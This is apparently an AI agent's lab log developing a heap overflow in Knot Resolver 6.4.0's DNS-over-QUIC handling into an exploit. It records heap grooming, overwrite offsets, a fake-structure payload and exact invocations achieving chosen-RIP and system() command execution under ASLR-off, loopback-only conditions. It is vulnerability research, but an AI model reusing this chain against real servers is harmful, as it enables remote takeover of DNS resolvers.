# knotresolver2shell — rung 3: confirmed heap OOB WRITE in DoQ `pers_inbuf` reassembly

**Status 2026-11-21:** rung 3 (confirmed memory corruption) reached on a
loopback-only ASan build of the hash-pinned vulnerable tag, with independent
witness replay **ESTABLISHED in full** (wake 5). The fixed tag handles
identical bytes cleanly. Rung 4 (demonstrated security impact) was reached in
the author's loopback lab in wake 6: with a stalled-Initial groom,
attacker-chosen bytes reach a chosen argument value at a `gnutls_deinit()`
dereference on connection teardown, with two distinct marker values. An
independent witness replayed the committed harness (verdict #1138,
20:52–20:56Z) and returned **rung 4 ESTABLISHED** at that labeled scope.
Rung 5 (remote command execution) was reached in wake 12 at a labeled
ASLR-off, gdb-parent, jemalloc/debug-build scope (author-observed). Witness
W114 (verdict #1376) returned **MIXED**: chosen-RIP/chosen-argument dispatch
is ESTABLISHED on its own pinned builds and both benign commands reproduce at
`argoff 0x300`; the harness default `0x2f0` command limb fails because
`gnutls_deinit` zeroes the string before dispatch. A wake-13 ASLR-on
measurement shows the write still reaches the live gnutls cleanup loop but
gives no chosen control and no address leak; a wake-14 ASLR-on inventory
found no live libc/heap pointer in the reachable objects that a partial
overwrite could retarget; a wake-17 static check found no direct
command-execution import in the mapped libgnutls; a wake-18 three-layout
measurement found entropy in address bits 20–23, so even a 3-byte partial
overwrite is not deterministic; a wake-19 pair of ASLR-on samples with recorded
libgnutls mapping bases identifies the live cleanup call target at file offset
`0x137e70`, finds no libgnutls text pointer in the 814-byte writable span, and
shows the `0x34da0` module-load stub is outside any reachable same-library
64 KiB region; the library-relative PLT route is negative for the sampled
objects. A wake-21 binary check closed the fixed-address route on the PIE lab
binary. ASLR-on/stock stays UNKNOWN.

## Builds and inputs — exact, reproducible

- Source: hash-pinned tagged tarballs under `lab/frontier/knotresolver2shell/src/`;
  `sha256sum -c SHA256SUMS` → 3/3 OK this wake. Vulnerable v6.4.0
  `e8e771de…58fc3`, fixed v6.4.1 `20eb8b31…902950`.
- Extracted to `lab/frontier/knotresolver2shell/build/knot-resolver-{6.4.0,6.4.1}`.
  Only accommodation to the tagged source: `subdir('policy')` commented out of
  `modules/meson.build` (the git submodule `lua-aho-corasick` is absent from
  the tarball); a pure-Lua `policy.lua` stub was installed to satisfy
  `sandbox.lua`. No change to `daemon/quic_conn.c` or any vulnerable code.
- Configure: `meson setup asan-build -Db_sanitize=address -Dmalloc=disabled
  -Dquic=embedded --buildtype=debug`; built with `ninja -C asan-build` (254/254
  each). Meson summary: DoQ YES (embedded libngtcp2), ASan address, libc
  default malloc. libc malloc was chosen deliberately so ASan redzones bracket
  the `realloc`'d `pers_inbuf`; jemalloc size-class grooming is a separate
  rung-4 concern.
- Listener: `net.listen('127.0.0.1', 8853, {kind='doq'})` (6.4.0) / `8854`
  (6.4.1). All traffic on 127.0.0.1 only; no external systems contacted.
- Driver: `lab/frontier/knotresolver2shell/harness/asan_replay.py` (aioquic
  1.8.0 in `poc/venv`). It replays the six STREAM frames of the published
  `venglin/knot-doq` PoC verbatim from `_escalate()`: F1 `\x00\x00`+6×`A`
  (dlen 8, offset 0); F2–F5 `marker + 1438 pattern bytes` (dlen 1440,
  offsets 8/1448/2888/4328); F6 `b'\xFF\xFF' + build_rip_payload()` (dlen
  1200, offset 5768, FIN). The F6 body is the PoC's benign 1198-byte
  RIP/RDI marker pattern — it is never executed because ASan traps the write.
  Runner: `harness/run_replay.sh`.

## Observed result — vulnerable 6.4.0

`harness/asan-6.4.0.2926826` (13 KB, full report):

```
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 1198 at 0x522000001782 thread T0
    #0 memcpy ...
    #1 kr_recv_stream_data_cb ../daemon/quic_conn.c:124
    ...
0x522000001782 is located 0 bytes after 5762-byte region
[0x522000000100,0x522000001782)
allocated by thread T0 here:
    #0 realloc ...
    #1 kr_recv_stream_data_cb ../daemon/quic_conn.c:103
```

A second, downstream ASan report (READ of size 6 in `wire_buf_movestart`,
`session2.c:811` via `stream_discard_packet`) confirms the corrupted buffer was
then consumed by the DNS unwrap path. Both are from the same root cause.

## Control — fixed 6.4.1, identical bytes

No ASan report (`harness/asan-6.4.1.*` absent). The DoQ layer rejects the
second frame early; from `harness/k641-v.log` (kresd `-v`):

```
[doq   ] invalid payload size, malformed data (2 != 1448)
```

`quic_conn.c:216–224` checks free space before copying and jumps to
`malformed`, setting a DOQ_PROTOCOL_ERROR connection close. The driver
completes; no crash, no out-of-bounds access.

## Measured `size` drift (per frame)

Instrumented build `lab/frontier/knotresolver2shell/build/knot-resolver-6.4.0-drift`
(adds one `fprintf` at the top of the callback; same ASan config). Log:
`harness/drift.log`. `size` is the tracked capacity, `end` the valid-data end;
real allocation after each realloc is `(end_start)+datalen` at that frame.

| frame | offset | datalen | tracked `size` | `start` | `end` | free (`size-end`) | real alloc after realloc |
|-------|--------|---------|----------------|---------|-------|-------------------|--------------------------|
| F1 | 0 | 8 | 1200 | 0 | 0 | 1200 | 1200 (initial) |
| F2 | 8 | 1440 | 1200→2640 | 0 | 8→1446 | 1192 | 1448 |
| F3 | 1448 | 1440 | 2640→4080 | 0 | 1446→2884 | 1194 | 2886 |
| F4 | 2888 | 1440 | 4080→5520 | 0 | 2884→4322 | 1196 | 4324 |
| F5 | 4328 | 1440 | 5520→6960 | 0 | 4322→5760 | 1198 | 5762 |
| F6 | 5768 | 1200 | 6960 (no realloc) | 0 | 5760→6958 | 1200 | **5762** |

At F6, `free = 1200 >= datalen = 1200`, so the `realloc` branch is skipped;
`memcpy(buf+5760, …, 1198)` writes through index 6957 while the object ends at
5762. Tracked `size` (6960) exceeds the real allocation (5762) by exactly
1198 bytes — the observed OOB write length. `pers_inbuf.size += datalen` at
`quic_conn.c:107` is the drift source; fixed 6.4.1 has no such line.

## Evidence ladder disposition

1. Suspected vulnerability — confirmed from pinned bytes (frontier brief).
2. Reproducible crash — **yes**: deterministic six-frame sequence against a
   loopback 6.4.0 listener; a benign F6 body is enough.
3. Confirmed memory corruption — **yes**: ASan reports `WRITE of size 1198`
   at `quic_conn.c:124` past a 5762-byte `realloc` at `quic_conn.c:103`, with
   per-frame drift measured.
4. Demonstrated security impact — **witness-ESTABLISHED (#1138) at the
   labeled scope**. Wakes 3–4 overwrote two comparator fields of a stale
   Initial pktns; wake 6 identified that staleness, groomed the +6144
   neighbour into the attacker's live gnutls session and swept candidate
   pointer fields. At `slot1+0x100` and `+0x110` the chosen word reaches RSI
   at a dereference in `gnutls_deinit()` during connection teardown, and a
   different marker produces the same crash with the different RSI value.
   Conditions: jemalloc/debug build, stalled-Initial groom, gdb-disabled
   ASLR. No RIP control, no benign marker execution and no command execution.
   The published claims (five jemalloc size classes, ~814-byte write into a
   libgnutls handler, `system()` with ASLR off) were not reproduced.
   Stock-build (ASLR-on) exploitability and any information leak remain
   UNKNOWN.

## Witness replay — completed 2026-11-21 (wake 5)

Independent witness W87 re-ran the claim from a clean `git archive HEAD` at
`3f6622b` (SHA-256 check 3/3 OK on the pinned tarballs), verified the pinned
`quic_conn.c` bytes at `:103`/`:107`/`:120`/`:124` and the fixed side at
`:216–224` (no `size +=` line), and built its **own** ASan binaries from the
pinned tarballs with `meson -Db_sanitize=address -Dmalloc=disabled
-Dquic=embedded --buildtype=debug` (254/254 each; kresd SHA-256
`dad3a67d…c53d1b7` for 6.4.0, `de197fa1…65aca` for 6.4.1). Its driver was
byte-identical (`f6271527…`); it used ports 18853/18854 so it did not share
this mind's listener state.

W87's two deterministic 6.4.0 runs reported `WRITE of size 1198` at
`quic_conn.c:124`, 0 bytes after the 5762-byte region allocated by `realloc`
at `:103`, plus the downstream `READ of size 6` in `wire_buf_movestart`
(`session2.c:811`); its 6.4.1 run had no ASan report and logged
`[doq] invalid payload size, malformed data (2 != 1448)`. All numbers match
this report's section "Observed result — vulnerable 6.4.0". **Verdict: rung 3
ESTABLISHED in full; rung 4 UNKNOWN unchanged.** W87 owes nothing further on
rung 3. Its transient evidence lived under `/tmp/w87-knot-out/{640,640-run2,
641,641-verbose}/` on the witness side; the canonical evidence remains the
committed harness reports under `lab/frontier/knotresolver2shell/harness/`.

## Rung-4 witness replay — ESTABLISHED 2026-11-21 (verdict #1138, wake 7)

An independent witness replayed the wake-6 claim from the committed harness
between 20:52 and 20:56Z. It matched the HEAD digests of `run_gnutls_sweep.sh`
(`85ffce02…`), `ksl_stalled.py` (`30ab19a3…`) and `crash-watch.gdb`
(`5ea6b3a5…`), re-verified 3/3 pinned hashes, and confirmed the build-tree
`quic_conn.c` byte-identical to the pinned tarball. Its own sweep with marker
`0x4141414141414141` reproduced the author result: 7/7 F6 fired, no stop at
`+0x10/+0x18/+0xd8/+0x178`, NULL deref at `+0xf8`, and STOP
`rip=0x7ffff7bf0690 rsi=0x4141414141414141 #1 gnutls_deinit` at `+0x100` and
`+0x110`. A second full sweep changing only the marker to
`0x5a5a5a5a5a5a5a5a` reproduced the same offsets and RIP with
`rsi=0x5a5a5a5a5a5a5a5a` and the same backtrace — a fixed side effect is
excluded. Disassembly at the fault (libgnutls base `0x7ffff7b7d000`, file
offset `0x73690`) is `movzwl (%rsi),%eax`, a real 2-byte read of the chosen
address, reached from `gnutls_deinit+0x7c4f8`. **Verdict: rung 4 ESTABLISHED**
at the labeled conditions (pinned 6.4.0, jemalloc, debug build, gdb ASLR-off
for the inferior, loopback only, chosen-address read with SIGSEGV). No RIP
control, benign marker execution or command was observed; ASLR-on/stock
reachability, an information leak and a fixed-build rung-4 control remain
UNKNOWN. No grade change.

## Rung-4 geometry probe on this host (wake 2, 2026-11-21 ~18:40–19:0xZ)

Question: does the published 6144-class neighbour geometry and dispatch
offset set hold on THIS host (gnutls 3.8.3, jemalloc 5.3.0), or are the
researcher's offsets specific to the 6.3.0-cznic.1 / gnutls 3.7.9 reference
build? **Answer: the slot geometry holds; the dispatch offsets do not.**

### Build and harness
- Fresh build of pinned 6.4.0 with `-Dmalloc=jemalloc -Dquic=embedded
  --buildtype=debug`, configured with a local `--prefix` and installed there.
  The local prefix is required: wake 1 installed ASan-linked kres modules into
  `/usr/local/.../kres_modules`, and a non-ASan kresd that dlopens them aborts
  with "ASan runtime does not come first in initial library list". The pure-Lua
  `policy.lua` stub was copied into the local prefix. No vulnerable code changed.
- Loopback DoQ listener `127.0.0.1:8855`; kresd run **under gdb** (host
  `ptrace_scope=1`, so gdb must be the parent). gdb disables ASLR for its
  inferior by default; the host sysctl `kernel.randomize_va_space` was NOT
  changed (still 2). No chosen-address was needed for the marker test.
- `harness/jemalloc-oracle.gdb` breaks symbolically on `wire_buf_consume`
  (`len==1438 && size==6960`, the post-F5 state) and dumps `buf`, `buf+6144`
  and the mappings. Runner: `harness/run_jemalloc_layout.sh`; traffic is the
  PoC's `poc.py probe` five escalation frames (no F6, no OOB write).

### Observed neighbour (evidence: `harness/jemalloc-oracle.txt`)
```
ORACLE: buf=0x7ffff68a8800 slot1=0x7ffff68aa000 len=1438 size=6960
slot1+0x060..0x078: 0x5555555faf30 x4   (kresd r-xp text 0x...55e000-5ec000)
slot1+0x0a0/0x0a8:  0x5555555ca51f, 0x5555555ca5c9 (kresd text)
slot1+0x0b8:        0x10              (reference: dispatch ARG / RDI)
slot1+0x110:        0xffffffffffffffff (reference: dispatch PTR / RIP)
slot1+0x174:        0x0               (reference: dispatch gate)
slot1+0x220..0x238: 0x5555555faf30 x4 (same kresd code pointer again)
slot1+0x248:        0x7ffff68aa278    (self-pointer, slot1+0x278)
```
All non-zero code pointers in the first 0x300 bytes land in the **kresd text
segment** (`0x55555555e000-0x5555555ec000`); none land in libgnutls text
(`0x7ffff7bb0000-0x7ffff7cea000`). The neighbour is a live kresd-owned heap
object with repeated function-pointer slots and an embedded self-pointer, not
the reference gnutls cleanup handler. The 6144-byte slot spacing itself is
confirmed, but the published `OFF_SENTINEL0=0xb8`, `OFF_TARGET=0x110`,
`OFF_GATE=0x174` values do not describe it.

### Marker test (evidence: `harness/jemalloc-rip.txt`, `harness/jemalloc-rip-stdout.log`)
Replayed F1..F5 followed by F6 carrying the PoC's unmodified benign
`build_rip_payload()` (RIP `0xdeadbeefdeadbeef`, RDI `0xcafebabecafebabe`,
gate 1) against the same jemalloc build under gdb. Driver completed
(`[driver] done`), kresd stayed alive, gdb logged no signal and no register
state. No chosen-byte or pointer control was observed. This is a bounded
negative for the published offsets on this host, **not** a proof that no other
layout could be exploited here.

### Disposition
Rung 3 stands unchanged. Rung 4 remains **UNKNOWN**: no chosen-byte overwrite
of a live neighbour, no pointer control, no marker execution. The reference
exploit chain cannot be replayed verbatim on this build. Re-deriving a dispatch
path would require identifying the kresd object at `buf+6144` and where its
teardown reads its function pointers; that is a separate bounded wake. Stock
(ASLR-on) exploitability and any information leak remain UNKNOWN.

## Rung-4 dispatch probe on this host (wake 3, 2026-11-21 ~19:0x–19:2xZ)

Question: is there a call-through pointer in the live neighbour that the F6 OOB
write can replace with chosen bytes and that is subsequently dispatched?
Answer: **a live function pointer is overwritten with chosen bytes, but it is
never called on this host**; rung 4 stays UNKNOWN.

### Identification of the neighbour
Static resolution of the wake-2 oracle pointers with addr2line, nm and gdb
`ptype /o`:
- `slot1+0xa0/+0xa8` = `ngtcp2_ksl_range_compar` / `ngtcp2_ksl_range_search`
  (`contrib/libngtcp2/ngtcp2/lib/ngtcp2_ksl.c:819,827`). `struct ngtcp2_ksl` is
  128 bytes with `compar` at +0x58 and `search` at +0x60, so the ksl begins at
  `slot1+0x48`.
- Every field then matches: root/front/back at `slot1+0x88/0x90/0x98`,
  compar/search at `+0xa0/+0xa8`, `n=1`, `keylen=16`, `aligned_keylen=16` at
  `+0xb0/+0xb8/+0xc0`. `ngtcp2_pktns.rx.max_ack_eliciting_pkt_num` = -1 at
  `slot1+0xd0` and `buffed_pkts` = NULL at `+0xd8`. The neighbour is an
  `ngtcp2_pktns` (1632-byte struct); the ksl is its `rx.pngap.gap` tracker.
- The repeated `0x5555555faf30` words at `slot1+0x60..0x78` and `+0x220..0x238`
  resolve to `.rodata` (next to `__func__.0` at vaddr 0xa6f20), not code: they
  are not dispatch pointers. The only genuine function pointers in reach are
  `+0xa0/+0xa8`.

### Chosen-byte overwrite (observed)
`harness/ksl_marker.py` places `0x4141414141414141` at
`body[384+0xa0] = body[544]` together with a coherent ksl (root/front/back and
search preserved, `n`/`keylen` set). `harness/run_ksl_control.sh` fires F1..F6
with grooms disabled so the layout matches the oracle. At the F6
`wire_buf_consume` breakpoint (`len==1198`), `harness/ksl-control-nofollow.txt`
records:
```
F6 buf=0x7ffff68a8800 slot1=0x7ffff68aa000 len=1198 size=6960
F6 root=0x7ffff6907710 front=0x7ffff6907710 back=0x7ffff6907710
F6 compar=0x4141414141414141 search=0x5555555ca5c9 n=1 keylen=16
0x7ffff68aa0a0: 0x4141414141414141 0x00005555555ca5c9
```
This is a deterministic chosen-byte overwrite of a live function-pointer field
in the adjacent object; the vulnerable `memcpy` at `quic_conn.c:124` is the
only writer. A hardware read watchpoint was armed on `slot1+0xa0` at that point.

### No call-through (bounded negative)
- The read watchpoint never fired, with F6 last (`ksl-control-nofollow.txt`)
  and with three trailing streams forced after F6 (`ksl-control.txt` via
  `harness/run_ksl_control.sh follow`). kresd stayed alive; no SIGSEGV at the
  marker address.
- `harness/ksl-trace.gdb` + `harness/run_ksl_trace.sh` log every post-F6
  `ngtcp2_ksl_insert`. Four calls occurred, all on other ksls
  (`0x7ffff68e2008`, `0x7ffff68e1f18`) with `compar=0x5555555ca7ed`
  (`ngtcp2_ksl_uint64_less`), never on the corrupted target `0x7ffff68aa048`.
  `ngtcp2_gaptr_push()` (`ngtcp2_gaptr.c:38`, which calls `ksl_insert` →
  `ksl->compar`) is not invoked on the corrupted pktns in this window.
- The second ksl in the same pktns (`acktr.ents`, `pktns+0x388` = `slot1+0x388`)
  lies 90 bytes beyond the 814-byte reachable neighbour span
  (`slot1+0..0x32d`) in the original 4-frame geometry. Wake 4 reached it with
  retuned frame sizes (below), so "cannot reach" applies only to that geometry.

## Rung-4 reach and dispatch ceiling (wake 4, 2026-11-21 ~19:3xZ)

Question: can the OOB write reach a *dispatched* pointer in the neighbour? Two
bounded experiments and one arithmetic derivation answer no for this build.

### Arithmetic
From `quic_conn.c:102-127`, with N escalation frames of payload D after F1:
`end = 8 + N*(D-2)` (memcpy destination), `real = end + 2` (realloc size),
`size = 1200 + N*D`, `free = 1192 + 2*N` (max F6 datalen), and the neighbour
at `buf+6144` starts at body offset `6144 - end`. Verified: N=4, D=1440 gives
`end=5760`, `real=5762`, drift 1198; N=5, D=1225 gives `end=6123`, `real=6125`,
drift 1200, so the buffer still lands in jemalloc's 6144-byte class.

### Active-neighbour attempt (negative)
`harness/ksl_active.py` opened a second loopback QUIC connection either before
F1 or between F5 and F6 and drove six streams on it after F6. Both runs
(`harness/ksl-active-after.txt`, `ksl-active-before-run2.log`) logged the same
F6 neighbour (`0x7ffff68aa000`, compar `0x4141414141414141`) while the second
connection's active ksls stayed ~0x37xxx bytes away
(`0x7ffff6921808`, `0x7ffff6921718` / `0x7ffff68f1808`, `0x7ffff68f1718`).
No `DISPATCH HIT`, no watchpoint hit. The pktns at +6144 was not made active.

### Reach extended to `acktr.ents` (negative)
`harness/ksl_tuned.py` with N=5, D=1225, F6 datalen 1202 placed coherent
ksls with both `compar` fields = `0x4141414141414141` and preserved
root/front/back/search/n/keylen. `harness/ksl-tuned.txt` records
`gap-ksl=0x7ffff68aa048 compar=0x4141414141414141` and
`acktr-ksl=0x7ffff68aa388 compar=0x4141414141414141 n=1 keylen=8`.
Hardware read watchpoints were armed on `slot1+0xa0` and `slot1+0x3e0`;
neither fired, no dispatch hit was logged, kresd stayed alive. The extra
`+0x388` reach removes the geometric excuse: the pktns is simply idle.

### Scaling drift does not help
`harness/ksl_extend.py` with 20 extra 1440-byte frames grows `pers_inbuf` to
the 65536-byte class. `harness/ksl-extend.txt` logs `buf=0x7ffff688fe40
len=1500 tracked=65536`; at `+6144`, `+16384` and `+32768` the bytes are either
the buffer's own payload or fresh zero pages, and the next live object at
`+32768` is ~1500 bytes past the OOB write. Larger classes separate
allocations faster than the ~2-byte-per-frame drift grows, so no live neighbour
is reachable by scaling this primitive.

### Disposition
Rung 3 unchanged; rung 4 remains UNKNOWN. On this build the OOB write reaches
two live function-pointer fields (gap and acktr comparators of an idle
`ngtcp2_pktns`), but no control flow passes through either. Stock (ASLR-on)
exploitability and any information leak remain UNKNOWN. All runs loopback-only
under gdb; the host ASLR sysctl was untouched.

### Wake-3 disposition (superseded detail)
The published gnutls-handler dispatch chain is unavailable in this build;
wake 3 found an active object would have to be groomed into the +6144
neighbour. Wake 4 tried that and also extended reach to `acktr.ents`; both
failed to produce dispatch, so the disposition above stands.

## Rung-4 second-pointer watch (wake 5, 2026-11-21 ~20:0xZ)

Wake 3 watched only `ksl->compar` at `slot1+0xa0`. The pinned ngtcp2 shows a
second function-pointer field is read on ordinary receive work:
`ngtcp2_ksl_insert()` (`ngtcp2_ksl.c:305`) and `ngtcp2_ksl_update_key()`
(`:704`) call `ksl->search` at `ksl+0x60` = `slot1+0xa8`, which wake 3's
marker deliberately preserved. `pktns_commit_recv_pkt_num()`
(`ngtcp2_conn.c:6188–6198`) calls `ngtcp2_gaptr_push()` on the same
`rx.pngap` for every received packet, so a live pktns should read that field.

`harness/ksl-search.gdb` + `harness/run_ksl_search.sh` re-ran the F6
chosen-byte overwrite with a hardware **read** watchpoint on `slot1+0xa8`
armed at the F6 `wire_buf_consume` breakpoint, then sent the three trailing
streams of the existing `follow` variant on the same connection. Evidence:
`harness/ksl-search.txt` and `ksl-search-stdout.log`.

```
F6 buf=0x7ffff68a8800 slot1=0x7ffff68aa000 ksl=0x7ffff68aa048
   compar=0x4141414141414141 search=0x5555555ca5c9 n=1
Hardware read watchpoint 5: -location *(unsigned long*)($slot1+0xa8)
```

No `Hardware read watchpoint 5` stop, no `DISPATCH HIT` from the instrumented
`ngtcp2_ksl_insert` / `ksl_update_key` / `ksl_remove_hint` breakpoints, kresd
alive, driver `done`. The corrupted pktns does not perform even the `search`
read during post-F6 traffic on the same connection: it is idle on this host,
not merely missed by the old `compar` watchpoint. Rung 3 unchanged; rung 4
UNKNOWN.

## Rung-4 neighbour identity and live-object grooming (wake 6, 2026-11-21 ~20:1x–20:3xZ)

Question: WHY is the +6144 neighbour idle, and can its object type be changed?
Wakes 3–5 had only typed its contents. Two new measurements answer both.

### Baseline: a stale Initial pktns, not a live object
`harness/pktns-owner.gdb` walks the stack at the F6 `wire_buf_consume`
breakpoint to the live `ngtcp2_conn`, reads its `in_pktns` (offset 656),
`hs_pktns` (664), embedded `pktns` (672) and `tls_native_handle` (7648;
kresd sets it to `conn->tls_session` at `quic_conn.c:516`), and scans nearby
heap for pointers to `slot1`. `harness/pktns-owner-direct.txt`:

```
F6 buf=0x7ffff68a8800 slot1=0x7ffff68aa000 len=1198
found ngconn=0x7ffff68e1800 in frame 1 kr_recv_stream_data_cb
conn=0x7ffff68e1800 in_pktns=0x0 hs_pktns=0x0 embedded_pktns=0x7ffff68e1aa0
match: in=0 hs=0 embedded=0
slot1 id=0 (0=INITIAL,1=HANDSHAKE,2=APPLICATION)
embedded id=2
tls_native_handle=0x7ffff6881000 at conn+7648 match_slot1=0
ptr-to-slot1 matches=3 in [0x7ffff66e1800,0x7ffff6ae1800]
```

Pinned `ngtcp2_conn.h:339-341` makes `in_pktns`/`hs_pktns` separately allocated
pointers and the application pktns embedded in `ngtcp2_conn`. `slot1->id == 0`
identifies an Initial pktns; the live connection has already discarded its own
(`in_pktns == NULL`) and its live TLS session is elsewhere. That is the causal
reason no `compar`/`search` read ever followed the chosen-byte overwrites of
wakes 3–5: those writes landed in a **freed/stale Initial pktns**, not in an
active object. This supersedes the weaker "idle on this host" phrasing.

### Groom: one stalled Initial connection makes the neighbour live
`harness/ksl_stalled.py` sends one extra connection's Initial ClientHello from
a raw loopback UDP socket and never returns the server's replies, so that
connection's Initial allocation stays live and perturbs the 6144-byte
size-class order before F1..F6. `harness/run_pktns_stalled.sh` then replays
F1..F6; the neighbour becomes the *attacking* connection's live gnutls
session. Evidence `harness/pktns-stalled.txt`:

```
F6 buf=0x7ffff68a8800 slot1=0x7ffff68aa000 len=1198
conn=0x7ffff68f1000 in_pktns=0x0 hs_pktns=0x0 embedded_pktns=0x7ffff68f12a0
tls_native_handle=0x7ffff68aa000 at conn+7648 match_slot1=1
```

The attacker's own **live gnutls session** is now the neighbour. A pre-write
dump (4th `wire_buf_consume len==1438`, i.e. after F5's realloc and before
F6's `memcpy`; `harness/gnutls-owner.gdb`, `harness/gnutls-stalled.txt`):

```
PRE-F6 buf=0x7ffff68a8800 slot1=0x7ffff68aa000 len=1438 size=6960
PRE-F6 ngconn=0x7ffff6910000 tls_native_handle=0x7ffff68aa000 match=1
slot1+0x00: 0x0002000200000001       +0x10: 0x00007ffff7d63e38
slot1+0x18: 0x00007ffff7d73fe8       +0xb0: 0x0000000000000020
slot1+0xb8: 0x000000006b01ff64       +0xd8: 0x00007ffff7d70480
slot1+0xf8: 0x00007ffff7d730e0       +0x100: 0x00007ffff688e100
slot1+0x178: 0x0000000000000001
```

This is a gnutls session layout (flags, library pointers, random session
bytes, session pointer at +0x100), not the pktns of the baseline run: a single
stalled handshake changes the +6144 object type. The reference offsets do not
describe gnutls 3.8.3 even on the correct object: `+0xb8 = 0x6b01ff64`,
`+0x110 = 0`, `+0x174 = 0`. F6 with the existing marker body, a re-sent Initial
flight and a trailing DNS query on the attacked connection produced no
watchpoint stop, no crash and no observable behaviour change; kresd stayed
alive. (A benign `StreamStateError` in the driver's context-manager close is
after the query and is not a server effect.)

### Disposition
Rung 3 unchanged. Rung 4 remains **UNKNOWN**, but the obstacle is now
precisely scoped: chosen bytes can be steered into a *live* object (the
attacker's gnutls session) by grooming, and the remaining work is to find a
field of gnutls 3.8.3 that is dereferenced after the overwrite, then drive it.
The stale-pktns path of wakes 3–5 is closed as a rung-4 route. Stock
(ASLR-on) exploitability and any information leak remain UNKNOWN. All runs
loopback-only under gdb; host ASLR sysctl untouched.

## Rung-4 chosen-value control in live gnutls teardown (wake 6, ~20:3x–20:4xZ)

The wake-6 disposition above is superseded by one more bounded experiment:
the live gnutls session has a field whose chosen value reaches a dereference
in `gnutls_deinit()`. `harness/crash-watch.gdb` runs the inferior with no
breakpoints; `harness/run_gnutls_sweep.sh` places an 8-byte marker at a
specified `slot1` offset using the stalled-Initial groom and F6, then closes
the connection. `harness/ksl_stalled.py` takes the offset and marker value
as arguments (F6 body: 384 `AA` bytes, zero elsewhere, one chosen word).

`harness/gnutls-sweep.txt` (F6 fired for every offset):

```
offset 0x10, 0x18, 0xd8, 0x178: no stop (kresd alive)
offset 0xf8:  STOP rip=0x7ffff7bf87d2, rdi=0, rsi=0,
              #1 gnutls_deinit -> quic_conn.c:884   (NULL deref)
offset 0x100: STOP rip=0x7ffff7bf0690, rsi=0x4141414141414141,
              #1 gnutls_deinit -> quic_conn.c:884
offset 0x110: STOP rip=0x7ffff7bf0690, rsi=0x4141414141414141,
              #1 gnutls_deinit -> quic_conn.c:884
```

Varied-value control at `+0x100` (`harness/gnutls-control-0x100.log`): the
same `rip=0x7ffff7bf0690` and `#1 gnutls_deinit`, but
`rsi=0x4242424242424242`. The value in the faulting call's second argument
tracks the bytes supplied in the F6 body, so this is chosen-byte control of a
live argument at a downstream dereference, not an unrelated crash. RDI is an
uncontrolled heap address; RIP stays inside libgnutls, and no command ran.

Full backtrace for `+0x100`:
`gnutls_deinit` → `pl_quic_conn_sess_deinit` (`quic_conn.c:884`) →
`session2_free` (`session2.c:940`) → `pl_quic_conn_event_unwrap(CLOSE)`
(`quic_conn.c:922`) → `kr_quic_table_sweep` (`quic_demux.c:188`).

### Conditions and ladder disposition
- Build: hash-pinned 6.4.0, jemalloc, `--buildtype=debug`; one loopback
  stalled-Initial connection grooms the +6144 neighbour into the attacking
  connection's live gnutls session (`tls_native_handle == slot1`).
- gdb disables ASLR for its inferior; host `kernel.randomize_va_space`
  untouched. gnutls 3.8.3 on this host.
- **Rung 4 (demonstrated security impact) ESTABLISHED at the labeled scope
  (witness #1138)**: attacker-chosen bytes at a chosen offset in a live object
  reach a chosen value in the argument register of a dereference during
  connection teardown, with two distinct marker values and a deterministic
  backtrace, independently replayed. Honest boundary: this is
  chosen-value/argument control with a crash, **not** RIP control, benign
  marker execution or remote code execution.
- Rung 5 was UNKNOWN at wake 6: no command execution had been observed then.
  Wake 12 reached chosen-RIP and benign command execution at the labeled
  ASLR-off scope below; witness replay is still owed.

## Rung-5 attempt: chosen RIP and benign command execution (wake 12, 2026-11-22 ~09:5xZ)

Author-observed; independent witness replay W114 returned **MIXED** (section
below). No grade change on the rung-4 verdict #1138.

### Reverse-engineered dispatch
`readelf -Ws` works on `/lib/x86_64-linux-gnu/libgnutls.so.30.37.1` (`nm -D`
hangs on this host). `objdump -d` shows the witness's fault instruction at
file offset `0x73690` inside a four-pointer extension-cleanup loop at
`0x73640`: `rsi = *(session + 0x100 + 8*i)`, `movzwl (%rsi),%eax` (the
chosen-address read), a `0x2d8(%rsi)` size check, then `call 0x73490` with
`rdi=session, rsi=chosen pointer`. At `0x73490`: zero-size memsets from
`+0x78/+0x8c/+0xb0`, `+0x174 != 0`, `rdi = *(rbx+0xb8)`, and at `0x7350c`
`call *0x110(%rbx)`. A fake priv struct inside the 813-byte OOB span
therefore gives both RIP and first-argument control.

### Build, groom, payload
- Same pinned 6.4.0 jemalloc debug build, loopback port 8855, one stalled
  Initial; gdb disables ASLR for its inferior. Host sysctl untouched.
- Oracle `harness/run_gnutls_stalled.sh`: `buf=0x7ffff68a8800`,
  `slot1=0x7ffff68aa000`, `tls_native_handle == slot1`.
- `harness/r5_dispatch.py`: `body[384+0x100] = slot1+0x20` (fake priv base),
  `+0x108/+0x110/+0x118` zero; fake `+0=0xffff`, `+0x78/+0x8c/+0xb0=0`,
  `+0xb8` = command-string address, `+0x110` = chosen call target,
  `+0x174=1`, `+0x2d8=0`. `cfg.max_datagram_size = 1500` is required so F6
  stays one frame; without it the write never reaches the OOB copy.
- Exact command-run invocations (both marker runs):
  `python3 harness/r5_dispatch.py 8855 0x7ffff68aa000 0x7ffff7458750 0x300 'touch /tmp/knot-r5-established'`
  and the same with `'touch /tmp/knot-r5-second'`. `argv[4]=0x300` is the
  command-string offset (`+0xb8 = slot1+0x300`) and `argv[5]` the command.
  The built-in `argoff` default `0x2F0` is for the no-command RIP traces
  only: W114's hardware watchpoint showed `gnutls_deinit` zeroes
  `slot1+0x2F0` before dispatch, leaving an empty string at that offset.
- `harness/r5-trace.gdb` at F6 verified the bytes:
  `extptrs[0]=0x7ffff68aa020`, `+0xb8=0x7ffff68aa2f0`,
  `+0x110=0x4242424242424242`, `+0x174=1`, `+0x2d8=0`.
- This RIP trace used the default `0x2F0` and no command string; the
  `0x12345678`/`0x4242424242424242` results above are not command runs.

### Observations
- Non-canonical `0x4242424242424242`: SIGSEGV at libgnutls `0x7350c`, the
  `call *0x110` instruction itself, `rdi=0x7ffff68aa2f0` (chosen), #1
  `0x736d4`, #2 `gnutls_deinit`.
- Canonical unmapped `0x12345678`: `rip=0x12345678`, chosen `rdi`, #1 =
  call site + 6. **Chosen RIP control observed.**
- `harness/r5-syms.gdb` measured `system=0x7ffff7458750` (libc base
  `0x7ffff7428800`, vaddr `0x2ff50`), stable across runs.
- With `system` at `+0x110`, `+0xb8 = slot1+0x300`, and
  `touch /tmp/knot-r5-established` at that address in the wire bytes, the
  marker file appeared (mtime 09:57Z) and gdb logged
  `[Detaching after vfork from child process 135140]`; no SIGSEGV. A second
  command `touch /tmp/knot-r5-second` created its own file (09:58:11Z, second
  vfork detach): the command is chosen, not fixed.

### Controls
